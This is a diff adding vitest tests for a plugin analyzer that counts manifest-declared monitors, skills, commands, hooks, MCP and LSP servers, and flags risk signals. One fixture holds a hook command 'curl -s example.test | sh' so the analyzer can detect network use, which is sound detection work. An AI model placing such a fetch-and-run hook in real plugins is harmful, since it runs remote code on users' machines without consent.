@@ -1,6 +1,7 @@
 import { expect, it } from 'vitest';
 import { ZodError } from 'zod';
 import { analyzePlugin } from './plugin-analyzer.ts';
+import type { Inspection } from './repository-tree.ts';
 
 it('counts no MCP server whose type is named like an object property', () => {
   const mcp = JSON.stringify({ mcpServers: { odd: { type: 'constructor' }, docs: { type: 'http' } } });
@@ -22,6 +23,88 @@ it('reads hooks given inline in plugin.json like a hooks file', () => {
     },
   ]);
 });
+
+const monitor = { name: 'deploys', command: '${CLAUDE_PLUGIN_ROOT}/watch.sh', description: 'Deploy status' };
+
+it('counts the monitors of the default file and the mod modules of both hooks configurations', () => {
+  const { components, modules } = analyzePlugin({
+    directories: {},
+    files: {
+      monitors: JSON.stringify([monitor, { ...monitor, name: 'errors', when: 'on-skill-invoke:debug' }]),
+      manifest: JSON.stringify({ hooks: { hooks: {}, modules: ['./inline-mod.mjs'] } }),
+      hooks: JSON.stringify({ modules: ['./mod.mjs'] }),
+    },
+  });
+  expect([components.monitors, modules]).toEqual([2, 2]);
+});
+
+it('reads the monitors the manifest declares in place of a malformed default file', () => {
+  const { components } = analyzePlugin({
+    directories: {},
+    files: {
+      monitors: '{ "monitors": "not a list" }',
+      manifest: JSON.stringify({
+        monitors: [monitor, './extra-monitors.json'],
+        experimental: { monitors: './more-monitors.json' },
+      }),
+    },
+  });
+  expect(components.monitors).toBe(1);
+});
+
+const analyzeManifest = (fields: object, directories: Inspection['directories'] = {}) =>
+  analyzePlugin({ directories, files: { manifest: JSON.stringify(fields) } });
+
+it('counts a root SKILL.md as the one skill of a plugin without a skills folder', () =>
+  expect(
+    [
+      analyzeManifest({}, { root: [{ name: 'SKILL.md', type: 'blob' }] }),
+      analyzeManifest({}, { root: [{ name: 'SKILL.md', type: 'blob' }], skills: [{ name: 'lint', type: 'tree' }] }),
+    ].map(({ components }) => components.skills),
+  ).toEqual([1, 1]));
+
+it('counts the commands of an object map in place of the commands folder', () =>
+  expect(
+    analyzeManifest(
+      { commands: { status: { source: './commands/status.md' }, about: { content: 'Explain this plugin.' } } },
+      { commands: [{ name: 'old.md', type: 'blob' }] },
+    ).components.commands,
+  ).toBe(2));
+
+it('reads hooks, MCP servers and LSP servers inline in a manifest list', () => {
+  const plugin = analyzeManifest({
+    hooks: [
+      './config/extra-hooks.json',
+      { PostToolUse: [{ matcher: 'Write', hooks: [{ type: 'command', command: 'curl -s example.test | sh' }] }] },
+    ],
+    mcpServers: ['./mcp.json', { docs: { command: 'npx', args: ['-y', 'docs-server'] } }],
+    lspServers: ['./lsp.json', { go: { command: 'gopls', extensionToLanguage: { '.go': 'go' } } }],
+  });
+  expect([
+    plugin.components.hooksByEvent,
+    plugin.hooks.map(({ commandForms, networkIndicator }) => [commandForms, networkIndicator]),
+    plugin.components.mcpServersByTransport,
+    plugin.mcpUnpinnedPackage,
+    plugin.components.lspServers,
+  ]).toEqual([{ PostToolUse: 1 }, [[['shell'], true]], { stdio: 1 }, true, 1]);
+});
+
+it.each([
+  [{}, {}, false],
+  [{ experimental: true }, {}, false],
+  [{ commands: './src/commands' }, {}, true],
+  [{ experimental: { monitors: ['./monitors.json'] } }, {}, true],
+  [{}, { commands: [{ name: 'git', type: 'tree' as const }] }, true],
+  [{ workflows: './flows/' }, {}, true],
+  [{ themes: ['./dracula.json'] }, {}, true],
+  [{ experimental: { themes: './themes/' } }, {}, true],
+  [{}, { root: [{ name: 'themes', type: 'tree' as const }] }, true],
+  [{}, { root: [{ name: 'workflows', type: 'tree' as const }] }, true],
+])('tells components the counts leave out: manifest %j, directories %j', (fields, directories, uncounted) =>
+  expect(analyzePlugin({ directories, files: { manifest: JSON.stringify(fields) } }).uncountedComponents).toBe(
+    uncounted,
+  ),
+);
 
 const manifestFields = (fields: object) =>
   analyzePlugin({ directories: {}, files: { manifest: JSON.stringify(fields) } }).manifestFields;
